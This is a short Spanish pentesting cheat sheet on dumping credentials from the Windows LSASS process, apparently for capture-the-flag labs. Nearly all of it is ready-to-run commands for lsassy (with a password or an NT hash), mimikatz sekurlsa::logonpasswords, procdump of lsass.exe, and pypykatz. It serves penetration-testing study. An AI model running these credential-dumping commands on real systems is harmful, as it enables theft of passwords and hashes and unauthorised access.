LSASS

LSASS ejecuta el subsistema LSA y puede mantener credenciales, hashes o material de autenticación en memoria. El volcado de este proceso requiere privilegios elevados y debe limitarse a laboratorios o pentests autorizados.

LSASS: Proceso que corre el sistema LSA y almacena secretos/hashes en Memoria

Dumpear proceso LSASS

Aviso: Requiere permisos elevados de Administrator para extraer Hashes

lsassy

Kali: Dumpear LSASS

# Credenciales Admin Local 
lsassy -d <dominio.htb> -u <user> -p <password> <ip_target>
# Hash Admin Local
lsassy -d dominio.htb -u <user> -H ':NT' <ip_target>
lsassy -d dominio.htb -u <user> -H ':027ae3139c0b6e47d3825660c1ede923' <ip_target>

Windows: Dumpear LSASS

mimikatz.exe # Iniciar Mimikatz
privilege::debug # Habilita privilegio SeDebugPrivilege
sekurlsa::logonpasswords # Extrae credenciales

Dumpear fichero lsass.dmp

Windows: Extraer lsasss.dmp

procdump.exe -accepteula -ma lsass.exe lsass.dmp # Descargar lsass.dmp

Ruta Windows de lsass.dmp: Administrador de Tareas -> Details -> lsass.exe -> Create Dump File

Kali: Dumpear lsass.dmp

pypykatz lsa minidump <lsass.dmp>

Windows: Dumpear lsass.dmp

mimikatz.exe # Iniciar Mimikatz
privilege::debug # Habilita privilegio SeDebugPrivilege
sekurlsa::minidump lsass.dmp # Carga el dumpeo de la memoria
sekurlsa::logonpasswords # Extrae credenciales

Relacionado: privilegio Debug.
